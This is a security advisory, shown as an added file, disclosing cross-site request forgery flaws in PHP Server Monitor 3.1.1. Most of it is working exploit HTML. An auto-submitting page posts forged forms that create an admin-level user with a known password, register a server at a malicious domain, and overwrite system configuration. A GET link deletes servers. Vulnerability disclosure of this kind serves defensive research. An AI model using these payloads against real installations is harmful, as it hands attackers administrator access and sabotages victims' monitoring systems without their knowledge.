@@ -1,0 +1,167 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-PHPSRVMONITOR-CSRF.txt
+
+
+Vendor:
+================================
+www.phpservermonitor.org
+sourceforge.net/projects/phpservermon/files/phpservermon/PHP%20Server%20Monitor%20v3.1.1/phpservermon-3.1.1.zip/download
+
+
+Product:
+================================
+PHP Server Monitor 3.1.1
+
+
+Vulnerability Type:
+=================================
+Cross site request forgery (CSRF)
+
+
+Vulnerability Details:
+=====================
+
+Multiple CSRF issues in PHP Server Monitor allow remote attackers to add
+arbitrary users & servers to the system, modify system configurations
+and delete arbitrary servers, if user (admin) is logged in and visits our
+malicious website or clicks on our infected linxs. As no CRSF protection is
+used in the application, we can make request on the victims behalf an the
+server will happily oblige processing our malicous HTTP requests.
+
+
+Exploit code(s):
+===============
+
+<!DOCTYPE>
+<html>
+<body onLoad="doit()">
+<script>
+function doit(){
+var e=document.getElementById('HELL')
+e.submit()
+}
+</script>
+
+
+1) add arbitrary users to the system:
+
+<form id="HELL" action="
+http://localhost/phpservermon-3.1.1/?&mod=user&action=save&id=0"
+method="post">
+<input type="text" name="user_name" value="hyp3rlinx" >
+<input type="text" name="name" value="hyp3rlinx">
+<input type="text" name="level" value="20">
+<input type="text" name="password" value="abc123">
+<input type="text" name="password_repeat" value="abc123">
+<input type="text" name="email" value="ghostofsin@abyss.com">
+<input type="text" name="mobile" value="">
+<input type="text" name="pushover_key" value="">
+<input type="text" name="pushover_device" value="">
+</form>
+
+
+
+2) add arbitrary servers to the system:
+
+<form id="HELL" action="
+http://localhost/phpservermon-3.1.1/?&mod=server&action=save&id=0&back_to="
+method="post">
+<input type="text" name="label" value="HELL" >
+<input type="text" name="ip" value="malicious-domain.hell">
+<input type="text" name="type" value="service">
+<input type="text" name="port" value="666">
+<input type="text" name="pattern" value="">
+<input type="text" name="warning_threshold" value="1">
+<input type="text" name="timeout" value="">
+<input type="text" name="active" value="yes">
+<input type="text" name="email" value="yes">
+<input type="text" name="sms" value="yes">
+<input type="text" name="pushover" value="yes">
+</form>
+
+
+3) modify system configuration:
+
+<form id="HELL" action="
+http://localhost/phpservermon-3.1.1/index.php?mod=config&action=save"
+method="post">
+<input type="text" name="language" value="en_US" >
+<input type="text" name="show_update%5B%5D=" value="on">
+<input type="text" name="auto_refresh_servers" value="0">
+<input type="text" name="alert_type" value="status">
+<input type="text" name="log_status%5B%5D" value="on">
+<input type="text" name="log_retention_period" value="1">
+<input type="text" name="email_status%5B%5D" value="on">
+<input type="text" name="log_email%5B%5D" value="on">
+<input type="text" name="email_from_name" value="ghostofsin">
+<input type="text" name="email_from_email" value="abysmalgodz@abyss.com">
+<input type="text" name="email_smtp_port" value="25">
+<input type="text" name="email_smtp_security" value="">
+<input type="text" name="email_smtp_username" value="">
+<input type="text" name="email_smtp_password" value="">
+<input type="text" name="test_email" value="1">
+<input type="text" name="log_sms%5B%5D" value="on">
+<input type="text" name="sms_gateway" value="whatever">
+<input type="text" name="sms_gateway_username" value="username">
+<input type="text" name="sms_gateway_password" value="password">
+<input type="text" name="sms_from" value="1234567890">
+<input type="text" name="test_sms" value="0">
+<input type="text" name="sms_from" value="1234567890">
+<input type="text" name="log_pushover%5B%5D" value="0">
+<input type="text" name="pushover_api_token" value="">
+<input type="text" name="test_pushover" value="0">
+</form>
+
+</body>
+</html>
+
+
+4) arbitrary server deletion via GET request:
+
+http://localhost/sectest/phpservermon-3.1.1/?&mod=server&action=delete&id=2
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+=========================================================
+High
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification: NA
+Oct 30, 2015  : Public Disclosure
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+]  GET / POST
+
+
+Vulnerable Product:             [+]  PHP Server Monitor 3.1.1
+
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
